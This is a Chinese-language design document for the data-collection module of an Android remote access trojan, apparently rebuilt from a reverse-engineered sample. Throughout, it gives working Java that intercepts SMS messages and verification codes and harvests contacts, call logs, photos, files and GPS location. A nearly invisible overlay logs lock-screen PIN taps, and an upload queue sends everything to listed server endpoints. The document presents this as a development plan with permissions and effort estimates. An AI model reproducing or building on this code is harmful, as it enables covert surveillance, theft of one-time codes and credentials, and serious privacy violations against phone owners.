# 模块 05：数据收集模块设计文档

> **模块名称**: Data Collection Module
> **优先级**: P1（高）
> **依赖**: 模块 01（网络通信模块）
> **版本**: 1.0
> **日期**: 2026-03-17

---

## 一、模块概述

### 1.1 功能描述

数据收集模块负责采集设备上的各类数据（短信、联系人、通话记录、文件、相册、应用列表、位置、锁屏密码等），并通过网络模块上传至服务端。

### 1.2 核心能力

- ✅ 短信收集（实时拦截 + 历史读取）
- ✅ 联系人收集（全量读取 + 增量同步）
- ✅ 通话记录收集（实时监听 + 历史读取）
- ✅ 文件扫描（指定目录 + 类型过滤）
- ✅ 相册监控（ContentObserver 实时监听新增照片/视频）
- ✅ 应用列表收集（已安装应用信息）
- ✅ 位置信息收集（GPS + 网络定位）
- ✅ 锁屏密码窃取（PIN 码 + 图案密码）
- ✅ 设备信息采集（硬件信息 + 系统参数）

---

## 二、架构设计

```
┌─────────────────────────────────────────────────────────┐
│                DataCollectionManager                     │
│  - 统一管理所有数据收集器                                  │
│  - 调度采集任务                                          │
│  - 管理上传队列                                          │
└─────────────────────────────────────────────────────────┘
        ↓                    ↓                    ↓
┌──────────────┐  ┌──────────────────┐  ┌──────────────────┐
│ Receiver 层   │  │  Observer 层      │  │  Scanner 层       │
│ SmsReceiver   │  │ PhotoObserver     │  │ FileScanner      │
│ CallReceiver  │  │ PasswordObserver  │  │ ContactScanner   │
│ BootReceiver  │  │                   │  │ AppListScanner   │
└──────────────┘  └──────────────────┘  └──────────────────┘
        ↓                    ↓                    ↓
┌─────────────────────────────────────────────────────────┐
│                   UploadQueue                            │
│  - 离线缓存                                              │
│  - 批量上传                                              │
│  - 失败重试                                              │
└─────────────────────────────────────────────────────────┘
        ↓
┌─────────────────────────────────────────────────────────┐
│             NetworkManager (模块 01)                     │
│  - HttpClient.post() 上传数据                            │
└─────────────────────────────────────────────────────────┘
```

### 2.1 包结构

```
com.vendor.rat.data
├── DataCollectionManager.java      # 数据收集管理器
├── UploadQueue.java                # 上传队列
├── receiver/
│   ├── SmsReceiver.java            # 短信广播接收器
│   └── CallReceiver.java           # 通话状态接收器
├── observer/
│   ├── PhotoAlbumContentObserver.java  # 相册变更监听
│   └── PasswordObserver.java       # 密码输入监听
├── scanner/
│   ├── ContactScanner.java         # 联系人扫描器
│   ├── FileScanner.java            # 文件扫描器
│   ├── AppListScanner.java         # 应用列表扫描器
│   └── LocationScanner.java        # 位置信息扫描器
├── collector/
│   ├── DeviceInfoCollector.java    # 设备信息采集器
│   └── LockCipherCollector.java    # 锁屏密码采集器
└── vo/
    ├── SmsVO.java                  # 短信数据模型
    ├── ContactVO.java              # 联系人数据模型
    ├── CallLogVO.java              # 通话记录数据模型
    ├── FileInfoVO.java             # 文件信息数据模型
    ├── PhotoVO.java                # 照片数据模型
    ├── AppInfoVO.java              # 应用信息数据模型
    ├── LocationVO.java             # 位置数据模型
    ├── LockCipherVO.java           # 锁屏密码数据模型
    └── DeviceInfoVO.java           # 设备信息数据模型
```

---

## 三、短信收集

### 3.1 SmsReceiver

**基于**: `com/guard/wallet/receiver/SmsReceiver.java`

```java
package com.vendor.rat.data.receiver;

public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            return;
        }

        Bundle bundle = intent.getExtras();
        if (bundle == null) return;

        Object[] pdus = (Object[]) bundle.get("pdus");
        String format = bundle.getString("format");
        if (pdus == null) return;

        for (Object pdu : pdus) {
            SmsMessage message;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                message = SmsMessage.createFromPdu((byte[]) pdu, format);
            } else {
                message = SmsMessage.createFromPdu((byte[]) pdu);
            }

            SmsVO smsVO = new SmsVO();
            smsVO.setSender(message.getOriginatingAddress());
            smsVO.setBody(message.getMessageBody());
            smsVO.setTimestamp(message.getTimestampMillis());
            smsVO.setType(0); // 0=收到

            // 加入上传队列
            UploadQueue.getInstance().enqueue(
                ApiEndpoints.SMS_UPLOAD, smsVO
            );
        }
    }
}
```

### 3.2 历史短信读取

```java
public class SmsHistoryReader {

    public static List<SmsVO> readAllSms(Context context) {
        List<SmsVO> smsList = new ArrayList<>();
        ContentResolver resolver = context.getContentResolver();

        Cursor cursor = resolver.query(
            Uri.parse("content://sms/inbox"),
            new String[]{"address", "body", "date", "type"},
            null, null,
            "date DESC LIMIT 500"
        );

        if (cursor == null) return smsList;

        try {
            while (cursor.moveToNext()) {
                SmsVO sms = new SmsVO();
                sms.setSender(cursor.getString(0));
                sms.setBody(cursor.getString(1));
                sms.setTimestamp(cursor.getLong(2));
                sms.setType(cursor.getInt(3));
                smsList.add(sms);
            }
        } finally {
            cursor.close();
        }

        return smsList;
    }
}
```

### 3.3 API 接口

```
POST /api/smsMessage/post.json

请求体:
{
    "deviceId": "device_123",
    "smsList": [
        {
            "sender": "+8613800138000",
            "body": "验证码: 123456",
            "timestamp": 1710000000000,
            "type": 0
        }
    ]
}
```

---

## 四、联系人收集

### 4.1 ContactScanner

**基于**: `com/guard/wallet/utils/g.java` (lines 1200-1350)

```java
package com.vendor.rat.data.scanner;

public class ContactScanner {

    public static List<ContactVO> scanAllContacts(Context context) {
        List<ContactVO> contacts = new ArrayList<>();
        ContentResolver resolver = context.getContentResolver();

        Cursor cursor = resolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            new String[]{
                ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME
            },
            null, null, null
        );

        if (cursor == null) return contacts;

        try {
            while (cursor.moveToNext()) {
                String contactId = cursor.getString(0);
                String name = cursor.getString(1);

                // 获取电话号码
                List<String> phones = getPhoneNumbers(resolver, contactId);
                // 获取邮箱
                List<String> emails = getEmails(resolver, contactId);

                ContactVO contact = new ContactVO();
                contact.setName(name);
                contact.setPhones(phones);
                contact.setEmails(emails);
                contacts.add(contact);
            }
        } finally {
            cursor.close();
        }

        return contacts;
    }

    private static List<String> getPhoneNumbers(
            ContentResolver resolver, String contactId) {
        List<String> phones = new ArrayList<>();

        Cursor cursor = resolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER},
            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
            new String[]{contactId},
            null
        );

        if (cursor == null) return phones;

        try {
            while (cursor.moveToNext()) {
                phones.add(cursor.getString(0));
            }
        } finally {
            cursor.close();
        }

        return phones;
    }

    private static List<String> getEmails(
            ContentResolver resolver, String contactId) {
        List<String> emails = new ArrayList<>();

        Cursor cursor = resolver.query(
            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
            new String[]{ContactsContract.CommonDataKinds.Email.ADDRESS},
            ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
            new String[]{contactId},
            null
        );

        if (cursor == null) return emails;

        try {
            while (cursor.moveToNext()) {
                emails.add(cursor.getString(0));
            }
        } finally {
            cursor.close();
        }

        return emails;
    }
}
```

### 4.2 API 接口

```
POST /api/contact/post.json

请求体:
{
    "deviceId": "device_123",
    "contacts": [
        {
            "name": "张三",
            "phones": ["+8613800138000", "+8613900139000"],
            "emails": ["zhangsan@example.com"]
        }
    ]
}
```

---

## 五、通话记录收集

### 5.1 CallReceiver

**基于**: `com/guard/wallet/receiver/CallReceiver.java`

```java
package com.vendor.rat.data.receiver;

public class CallReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!TelephonyManager.ACTION_PHONE_STATE_CHANGED.equals(
                intent.getAction())) {
            return;
        }

        String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);

        // 通话结束时采集记录
        if (TelephonyManager.EXTRA_STATE_IDLE.equals(state)) {
            // 延迟 2 秒确保记录写入
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                List<CallLogVO> logs = readRecentCallLogs(context, 10);
                if (!logs.isEmpty()) {
                    UploadQueue.getInstance().enqueue(
                        ApiEndpoints.CALL_LOG_UPLOAD, logs
                    );
                }
            }, 2000);
        }
    }

    private List<CallLogVO> readRecentCallLogs(Context context, int limit) {
        List<CallLogVO> logs = new ArrayList<>();
        ContentResolver resolver = context.getContentResolver();

        Cursor cursor = resolver.query(
            CallLog.Calls.CONTENT_URI,
            new String[]{
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DURATION,
                CallLog.Calls.DATE,
                CallLog.Calls.CACHED_NAME
            },
            null, null,
            CallLog.Calls.DATE + " DESC LIMIT " + limit
        );

        if (cursor == null) return logs;

        try {
            while (cursor.moveToNext()) {
                CallLogVO log = new CallLogVO();
                log.setNumber(cursor.getString(0));
                log.setType(cursor.getInt(1));     // 1=来电 2=去电 3=未接
                log.setDuration(cursor.getLong(2)); // 通话时长（秒）
                log.setDate(cursor.getLong(3));     // 通话时间
                log.setName(cursor.getString(4));   // 联系人名称
                logs.add(log);
            }
        } finally {
            cursor.close();
        }

        return logs;
    }
}
```

### 5.2 API 接口

```
POST /api/message/post.json

请求体:
{
    "deviceId": "device_123",
    "callLogs": [
        {
            "number": "+8613800138000",
            "type": 1,
            "duration": 120,
            "date": 1710000000000,
            "name": "张三"
        }
    ]
}
```

---

## 六、相册监控

### 6.1 PhotoAlbumContentObserver

**基于**: `com/guard/wallet/observer/PhotoAlbumContentObserver.java`

```java
package com.vendor.rat.data.observer;

public class PhotoAlbumContentObserver extends ContentObserver {

    private final Context context;
    private long lastProcessedTime = 0;

    public PhotoAlbumContentObserver(Handler handler, Context context) {
        super(handler);
        this.context = context;
    }

    /**
     * 注册监听
     */
    public void register() {
        ContentResolver resolver = context.getContentResolver();

        // 监听图片变化
        resolver.registerContentObserver(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            true, this
        );

        // 监听视频变化
        resolver.registerContentObserver(
            MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            true, this
        );
    }

    @Override
    public void onChange(boolean selfChange, Uri uri) {
        super.onChange(selfChange, uri);

        // 防抖：500ms 内重复通知只处理一次
        long now = System.currentTimeMillis();
        if (now - lastProcessedTime < 500) return;
        lastProcessedTime = now;

        if (uri == null) return;

        String uriString = uri.toString();

        if (uriString.contains("images")) {
            handleNewPhoto(uri);
        } else if (uriString.contains("video")) {
            handleNewVideo(uri);
        }
    }

    private void handleNewPhoto(Uri uri) {
        Cursor cursor = context.getContentResolver().query(
            uri,
            new String[]{
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.DATE_ADDED
            },
            null, null,
            MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 1"
        );

        if (cursor != null && cursor.moveToFirst()) {
            PhotoVO photo = new PhotoVO();
            photo.setFilePath(cursor.getString(0));
            photo.setFileName(cursor.getString(1));
            photo.setFileSize(cursor.getLong(2));
            photo.setDateAdded(cursor.getLong(3));

            UploadQueue.getInstance().enqueueFile(
                ApiEndpoints.PHOTO_UPLOAD, photo
            );
            cursor.close();
        }
    }

    private void handleNewVideo(Uri uri) {
        Cursor cursor = context.getContentResolver().query(
            uri,
            new String[]{
                MediaStore.Video.Media.DATA,
                MediaStore.Video.Media.DISPLAY_NAME,
                MediaStore.Video.Media.SIZE,
                MediaStore.Video.Media.DURATION,
                MediaStore.Video.Media.DATE_ADDED
            },
            null, null,
            MediaStore.Video.Media.DATE_ADDED + " DESC LIMIT 1"
        );

        if (cursor != null && cursor.moveToFirst()) {
            PhotoVO video = new PhotoVO();
            video.setFilePath(cursor.getString(0));
            video.setFileName(cursor.getString(1));
            video.setFileSize(cursor.getLong(2));
            video.setDuration(cursor.getLong(3));
            video.setDateAdded(cursor.getLong(4));

            UploadQueue.getInstance().enqueueFile(
                ApiEndpoints.VIDEO_UPLOAD, video
            );
            cursor.close();
        }
    }
}
```

### 6.2 API 接口

```
POST /api/photoFile/batch.json   # 照片上传
POST /api/videoFile/batch.json   # 视频上传

Content-Type: multipart/form-data
- deviceId: 设备标识
- file: 文件二进制数据
- fileName: 文件名
- fileSize: 文件大小
```

---

## 七、文件扫描

### 7.1 FileScanner

```java
package com.vendor.rat.data.scanner;

public class FileScanner {

    // 目标扫描目录
    private static final String[] SCAN_DIRS = {
        Environment.getExternalStorageDirectory().getAbsolutePath(),
        "/sdcard/Download",
        "/sdcard/Documents",
        "/sdcard/DCIM",
        "/sdcard/Pictures",
        "/sdcard/Tencent/MicroMsg",    // 微信文件
        "/sdcard/Tencent/QQfile_recv", // QQ 文件
    };

    // 目标文件扩展名
    private static final String[] TARGET_EXTENSIONS = {
        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        ".pdf", ".txt", ".csv",
        ".jpg", ".jpeg", ".png", ".gif",
        ".mp4", ".avi", ".mov",
        ".zip", ".rar", ".7z",
        ".apk"
    };

    /**
     * 扫描指定目录下的目标文件
     */
    public static List<FileInfoVO> scanFiles(int maxFiles) {
        List<FileInfoVO> fileList = new ArrayList<>();

        for (String dir : SCAN_DIRS) {
            File directory = new File(dir);
            if (directory.exists() && directory.isDirectory()) {
                scanDirectory(directory, fileList, maxFiles, 0, 5);
            }
            if (fileList.size() >= maxFiles) break;
        }

        return fileList;
    }

    private static void scanDirectory(
            File dir, List<FileInfoVO> result,
            int maxFiles, int depth, int maxDepth) {
        if (depth > maxDepth || result.size() >= maxFiles) return;

        File[] files = dir.listFiles();
        if (files == null) return;

        for (File file : files) {
            if (result.size() >= maxFiles) return;

            if (file.isDirectory()) {
                scanDirectory(file, result, maxFiles, depth + 1, maxDepth);
            } else if (isTargetFile(file)) {
                FileInfoVO info = new FileInfoVO();
                info.setFilePath(file.getAbsolutePath());
                info.setFileName(file.getName());
                info.setFileSize(file.length());
                info.setLastModified(file.lastModified());
                info.setExtension(getExtension(file.getName()));
                result.add(info);
            }
        }
    }

    private static boolean isTargetFile(File file) {
        String name = file.getName().toLowerCase();
        for (String ext : TARGET_EXTENSIONS) {
            if (name.endsWith(ext)) return true;
        }
        return false;
    }

    private static String getExtension(String fileName) {
        int dot = fileName.lastIndexOf('.');
        return dot > 0 ? fileName.substring(dot) : "";
    }
}
```

---

## 八、应用列表收集

### 8.1 AppListScanner

```java
package com.vendor.rat.data.scanner;

public class AppListScanner {

    public static List<AppInfoVO> scanInstalledApps(Context context) {
        List<AppInfoVO> appList = new ArrayList<>();
        PackageManager pm = context.getPackageManager();

        List<PackageInfo> packages = pm.getInstalledPackages(0);

        for (PackageInfo pkg : packages) {
            AppInfoVO app = new AppInfoVO();
            app.setPackageName(pkg.packageName);
            app.setAppName(pkg.applicationInfo.loadLabel(pm).toString());
            app.setVersionName(pkg.versionName);
            app.setVersionCode(pkg.versionCode);
            app.setInstallTime(pkg.firstInstallTime);
            app.setUpdateTime(pkg.lastUpdateTime);
            app.setSystemApp(
                (pkg.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0
            );
            appList.add(app);
        }

        return appList;
    }
}
```

### 8.2 API 接口

```
POST /api/package/post.json

请求体:
{
    "deviceId": "device_123",
    "apps": [
        {
            "packageName": "com.tencent.mm",
            "appName": "微信",
            "versionName": "8.0.40",
            "versionCode": 3200,
            "installTime": 1700000000000,
            "systemApp": false
        }
    ]
}
```

---

## 九、位置信息收集

### 9.1 LocationScanner

```java
package com.vendor.rat.data.scanner;

public class LocationScanner {

    private LocationManager locationManager;
    private LocationListener locationListener;

    public void startLocationTracking(Context context) {
        locationManager = (LocationManager)
            context.getSystemService(Context.LOCATION_SERVICE);

        locationListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                LocationVO loc = new LocationVO();
                loc.setLatitude(location.getLatitude());
                loc.setLongitude(location.getLongitude());
                loc.setAccuracy(location.getAccuracy());
                loc.setProvider(location.getProvider());
                loc.setTimestamp(location.getTime());

                UploadQueue.getInstance().enqueue(
                    ApiEndpoints.LOCATION_UPLOAD, loc
                );
            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {}
            @Override
            public void onProviderEnabled(String provider) {}
            @Override
            public void onProviderDisabled(String provider) {}
        };

        // GPS 定位（精确）
        try {
            locationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER,
                300000,  // 5 分钟间隔
                100,     // 100 米变化
                locationListener
            );
        } catch (SecurityException e) {
            // GPS 权限未授予
        }

        // 网络定位（粗略，无需 GPS 权限）
        try {
            locationManager.requestLocationUpdates(
                LocationManager.NETWORK_PROVIDER,
                300000,
                100,
                locationListener
            );
        } catch (SecurityException e) {
            // 网络定位不可用
        }
    }

    public void stopLocationTracking() {
        if (locationManager != null && locationListener != null) {
            locationManager.removeUpdates(locationListener);
        }
    }
}
```

---

## 十、锁屏密码窃取

### 10.1 LockCipherCollector

**基于**: `com/guard/wallet/plug/c.java` (CrackLockCipherPlug)

```java
package com.vendor.rat.data.collector;

/**
 * 通过透明悬浮窗覆盖锁屏界面，记录触摸坐标推算 PIN 码
 *
 * 实现原理：
 * 1. 监听 SCREEN_OFF 事件
 * 2. 在锁屏界面上方叠加透明悬浮窗
 * 3. 记录触摸坐标 → 映射到 PIN 按键
 * 4. 上传推算的 PIN 码
 */
public class LockCipherCollector {

    private WindowManager windowManager;
    private View overlayView;
    private StringBuilder pinBuffer = new StringBuilder();

    // PIN 键盘区域映射 (基于标准 Android 锁屏)
    // 行列坐标 → 数字映射
    private static final int[][] PIN_GRID = {
        {1, 2, 3},
        {4, 5, 6},
        {7, 8, 9},
        {-1, 0, -2}  // -1=空, -2=删除
    };

    /**
     * 启动密码采集（SCREEN_OFF 时调用）
     */
    public void startCapture(Context context) {
        windowManager = (WindowManager)
            context.getSystemService(Context.WINDOW_SERVICE);

        WindowManager.LayoutParams params = new WindowManager.LayoutParams();
        params.type = WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;
        params.flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
            | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
            | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH;
        params.width = WindowManager.LayoutParams.MATCH_PARENT;
        params.height = WindowManager.LayoutParams.MATCH_PARENT;
        params.format = PixelFormat.TRANSLUCENT;
        params.alpha = 0.01f; // 几乎不可见

        overlayView = new View(context);
        overlayView.setBackgroundColor(Color.TRANSPARENT);

        overlayView.setOnTouchListener((v, event) -> {
            if (event.getAction() == MotionEvent.ACTION_DOWN) {
                int digit = mapTouchToDigit(
                    event.getX(), event.getY(),
                    v.getWidth(), v.getHeight()
                );
                if (digit >= 0) {
                    pinBuffer.append(digit);
                }

                // 4-6 位时认为是完整 PIN
                if (pinBuffer.length() >= 4) {
                    uploadPin(pinBuffer.toString());
                }
            }
            return false; // 不拦截触摸事件
        });

        windowManager.addView(overlayView, params);
    }

    /**
     * 触摸坐标 → PIN 数字映射
     */
    private int mapTouchToDigit(
            float x, float y, int screenWidth, int screenHeight) {
        // PIN 键盘通常位于屏幕下半部分
        float keyboardTop = screenHeight * 0.4f;
        float keyboardBottom = screenHeight * 0.95f;
        float keyboardLeft = screenWidth * 0.1f;
        float keyboardRight = screenWidth * 0.9f;

        if (y < keyboardTop || y > keyboardBottom) return -1;
        if (x < keyboardLeft || x > keyboardRight) return -1;

        float keyWidth = (keyboardRight - keyboardLeft) / 3;
        float keyHeight = (keyboardBottom - keyboardTop) / 4;

        int col = (int) ((x - keyboardLeft) / keyWidth);
        int row = (int) ((y - keyboardTop) / keyHeight);

        col = Math.min(col, 2);
        row = Math.min(row, 3);

        return PIN_GRID[row][col];
    }

    private void uploadPin(String pin) {
        LockCipherVO cipher = new LockCipherVO();
        cipher.setType("PIN");
        cipher.setValue(pin);
        cipher.setTimestamp(System.currentTimeMillis());

        UploadQueue.getInstance().enqueue(
            ApiEndpoints.LOCK_CIPHER_UPLOAD, cipher
        );

        pinBuffer.setLength(0); // 重置缓冲
    }

    public void stopCapture() {
        if (windowManager != null && overlayView != null) {
            windowManager.removeView(overlayView);
            overlayView = null;
        }
    }
}
```

### 10.2 API 接口

```
POST /api/cipher/postLockCipher.json

请求体:
{
    "deviceId": "device_123",
    "type": "PIN",
    "value": "1234",
    "timestamp": 1710000000000
}
```

---

## 十一、上传队列

### 11.1 UploadQueue

```java
package com.vendor.rat.data;

public class UploadQueue {

    private static volatile UploadQueue instance;
    private final LinkedBlockingQueue<UploadTask> queue;
    private final ExecutorService executor;
    private final HttpClient httpClient;
    private volatile boolean running = true;

    private UploadQueue() {
        queue = new LinkedBlockingQueue<>(1000);
        executor = Executors.newFixedThreadPool(2);
        httpClient = NetworkManager.getInstance().getHttpClient();

        // 启动消费线程
        executor.submit(this::processQueue);
    }

    public static UploadQueue getInstance() {
        if (instance == null) {
            synchronized (UploadQueue.class) {
                if (instance == null) {
                    instance = new UploadQueue();
                }
            }
        }
        return instance;
    }

    /**
     * 数据入队
     */
    public void enqueue(String endpoint, Object data) {
        UploadTask task = new UploadTask(endpoint, data, false);
        queue.offer(task);
    }

    /**
     * 文件入队
     */
    public void enqueueFile(String endpoint, Object data) {
        UploadTask task = new UploadTask(endpoint, data, true);
        queue.offer(task);
    }

    /**
     * 消费循环
     */
    private void processQueue() {
        while (running) {
            try {
                // 批量取出（最多 10 条）
                List<UploadTask> batch = new ArrayList<>();
                UploadTask first = queue.poll(30, TimeUnit.SECONDS);
                if (first != null) {
                    batch.add(first);
                    queue.drainTo(batch, 9);
                }

                if (batch.isEmpty()) continue;

                // 按 endpoint 分组上传
                Map<String, List<UploadTask>> grouped = batch.stream()
                    .collect(Collectors.groupingBy(UploadTask::getEndpoint));

                for (Map.Entry<String, List<UploadTask>> entry : grouped.entrySet()) {
                    uploadBatch(entry.getKey(), entry.getValue());
                }

            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
    }

    private void uploadBatch(String endpoint, List<UploadTask> tasks) {
        int retryCount = 0;
        int maxRetries = 3;

        while (retryCount < maxRetries) {
            try {
                if (tasks.get(0).isFile()) {
                    // 文件逐个上传
                    for (UploadTask task : tasks) {
                        httpClient.uploadFile(endpoint, task.getData());
                    }
                } else {
                    // 数据批量上传
                    List<Object> dataList = tasks.stream()
                        .map(UploadTask::getData)
                        .collect(Collectors.toList());
                    httpClient.post(endpoint, dataList, null);
                }
                return; // 成功
            } catch (Exception e) {
                retryCount++;
                if (retryCount < maxRetries) {
                    try {
                        // 指数退避: 1s, 2s, 4s
                        Thread.sleep(1000L * (1 << (retryCount - 1)));
                    } catch (InterruptedException ie) {
                        Thread.currentThread().interrupt();
                        return;
                    }
                }
            }
        }

        // 3 次失败，保存到本地文件待后续重传
        saveToLocalCache(endpoint, tasks);
    }

    private void saveToLocalCache(String endpoint, List<UploadTask> tasks) {
        // 序列化到本地文件，等网络恢复后重新上传
    }

    public void shutdown() {
        running = false;
        executor.shutdown();
    }

    /**
     * 上传任务
     */
    private static class UploadTask {
        private final String endpoint;
        private final Object data;
        private final boolean file;

        public UploadTask(String endpoint, Object data, boolean file) {
            this.endpoint = endpoint;
            this.data = data;
            this.file = file;
        }

        public String getEndpoint() { return endpoint; }
        public Object getData() { return data; }
        public boolean isFile() { return file; }
    }
}
```

---

## 十二、设备信息采集

### 12.1 DeviceInfoCollector

```java
package com.vendor.rat.data.collector;

public class DeviceInfoCollector {

    public static DeviceInfoVO collectDeviceInfo(Context context) {
        DeviceInfoVO info = new DeviceInfoVO();

        // 基本信息
        info.setBrand(Build.BRAND);
        info.setModel(Build.MODEL);
        info.setManufacturer(Build.MANUFACTURER);
        info.setAndroidVersion(Build.VERSION.RELEASE);
        info.setSdkVersion(Build.VERSION.SDK_INT);
        info.setFingerprint(Build.FINGERPRINT);

        // 屏幕信息
        DisplayMetrics metrics = context.getResources().getDisplayMetrics();
        info.setScreenWidth(metrics.widthPixels);
        info.setScreenHeight(metrics.heightPixels);
        info.setScreenDensity(metrics.density);

        // 存储信息
        StatFs statFs = new StatFs(
            Environment.getExternalStorageDirectory().getPath()
        );
        long totalBytes = statFs.getTotalBytes();
        long availBytes = statFs.getAvailableBytes();
        info.setTotalStorage(totalBytes);
        info.setAvailableStorage(availBytes);

        // 内存信息
        ActivityManager am = (ActivityManager)
            context.getSystemService(Context.ACTIVITY_SERVICE);
        ActivityManager.MemoryInfo memInfo = new ActivityManager.MemoryInfo();
        am.getMemoryInfo(memInfo);
        info.setTotalMemory(memInfo.totalMem);
        info.setAvailableMemory(memInfo.availMem);

        // 网络信息
        ConnectivityManager cm = (ConnectivityManager)
            context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = cm.getActiveNetworkInfo();
        if (networkInfo != null) {
            info.setNetworkType(networkInfo.getTypeName());
            info.setConnected(networkInfo.isConnected());
        }

        return info;
    }
}
```

---

## 十三、数据收集管理器

### 13.1 DataCollectionManager

```java
package com.vendor.rat.data;

public class DataCollectionManager {

    private static volatile DataCollectionManager instance;
    private Context context;
    private PhotoAlbumContentObserver photoObserver;
    private LocationScanner locationScanner;
    private ScheduledExecutorService scheduler;

    public static DataCollectionManager getInstance() {
        if (instance == null) {
            synchronized (DataCollectionManager.class) {
                if (instance == null) {
                    instance = new DataCollectionManager();
                }
            }
        }
        return instance;
    }

    public void init(Context context) {
        this.context = context.getApplicationContext();
        this.scheduler = Executors.newScheduledThreadPool(2);
    }

    /**
     * 启动所有数据收集任务
     */
    public void startAll() {
        // 1. 注册相册监听
        startPhotoObserver();

        // 2. 启动位置追踪
        startLocationTracking();

        // 3. 定时任务：联系人同步（每 30 分钟）
        scheduler.scheduleAtFixedRate(
            this::syncContacts, 0, 30, TimeUnit.MINUTES
        );

        // 4. 定时任务：文件扫描（每 60 分钟）
        scheduler.scheduleAtFixedRate(
            this::scanFiles, 5, 60, TimeUnit.MINUTES
        );

        // 5. 定时任务：应用列表（每 6 小时）
        scheduler.scheduleAtFixedRate(
            this::syncAppList, 1, 360, TimeUnit.MINUTES
        );

        // 6. 一次性任务：设备信息上报
        scheduler.schedule(this::uploadDeviceInfo, 10, TimeUnit.SECONDS);
    }

    private void startPhotoObserver() {
        HandlerThread thread = new HandlerThread("PhotoObserver");
        thread.start();
        photoObserver = new PhotoAlbumContentObserver(
            new Handler(thread.getLooper()), context
        );
        photoObserver.register();
    }

    private void startLocationTracking() {
        locationScanner = new LocationScanner();
        locationScanner.startLocationTracking(context);
    }

    private void syncContacts() {
        List<ContactVO> contacts = ContactScanner.scanAllContacts(context);
        UploadQueue.getInstance().enqueue(
            ApiEndpoints.CONTACT_UPLOAD, contacts
        );
    }

    private void scanFiles() {
        List<FileInfoVO> files = FileScanner.scanFiles(200);
        UploadQueue.getInstance().enqueue(
            ApiEndpoints.FILE_LIST_UPLOAD, files
        );
    }

    private void syncAppList() {
        List<AppInfoVO> apps = AppListScanner.scanInstalledApps(context);
        UploadQueue.getInstance().enqueue(
            ApiEndpoints.APP_LIST_UPLOAD, apps
        );
    }

    private void uploadDeviceInfo() {
        DeviceInfoVO info = DeviceInfoCollector.collectDeviceInfo(context);
        UploadQueue.getInstance().enqueue(
            ApiEndpoints.DEVICE_INFO_UPLOAD, info
        );
    }

    public void stopAll() {
        if (photoObserver != null) {
            context.getContentResolver().unregisterContentObserver(photoObserver);
        }
        if (locationScanner != null) {
            locationScanner.stopLocationTracking();
        }
        if (scheduler != null) {
            scheduler.shutdown();
        }
        UploadQueue.getInstance().shutdown();
    }
}
```

---

## 十四、API 端点汇总

| 端点 | 方法 | 数据类型 | 触发方式 |
|------|------|---------|---------|
| `/api/smsMessage/post.json` | POST | 短信 | 实时广播 |
| `/api/contact/post.json` | POST | 联系人 | 定时 30 分钟 |
| `/api/message/post.json` | POST | 通话记录 | 实时广播 |
| `/api/photoFile/batch.json` | POST | 照片 | ContentObserver |
| `/api/videoFile/batch.json` | POST | 视频 | ContentObserver |
| `/api/package/post.json` | POST | 应用列表 | 定时 6 小时 |
| `/api/cipher/postLockCipher.json` | POST | 锁屏密码 | 息屏触发 |

---

## 十五、所需权限

```xml
<!-- 短信 -->
<uses-permission android:name="android.permission.RECEIVE_SMS" />
<uses-permission android:name="android.permission.READ_SMS" />

<!-- 通话记录 -->
<uses-permission android:name="android.permission.READ_CALL_LOG" />
<uses-permission android:name="android.permission.READ_PHONE_STATE" />

<!-- 联系人 -->
<uses-permission android:name="android.permission.READ_CONTACTS" />

<!-- 存储 -->
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />

<!-- 位置 -->
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />

<!-- 悬浮窗（锁屏密码采集） -->
<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
```

---

## 十六、工作量估算

| 功能 | 工作量 | 优先级 |
|------|--------|--------|
| 短信收集（实时 + 历史） | 1 天 | P0 |
| 联系人收集 | 1 天 | P0 |
| 通话记录收集 | 1 天 | P0 |
| 相册监控 | 1.5 天 | P1 |
| 文件扫描 | 1 天 | P1 |
| 应用列表 | 0.5 天 | P2 |
| 位置追踪 | 1 天 | P1 |
| 锁屏密码窃取 | 2 天 | P1 |
| 设备信息采集 | 0.5 天 | P0 |
| 上传队列 | 1.5 天 | P0 |
| **总计** | **11 天** | - |

---

**文档版本**: 1.0
**最后更新**: 2026-03-17
**基于逆向分析**: `com/guard/wallet/receiver/`, `com/guard/wallet/utils/g.java`, `com/guard/wallet/plug/c.java`
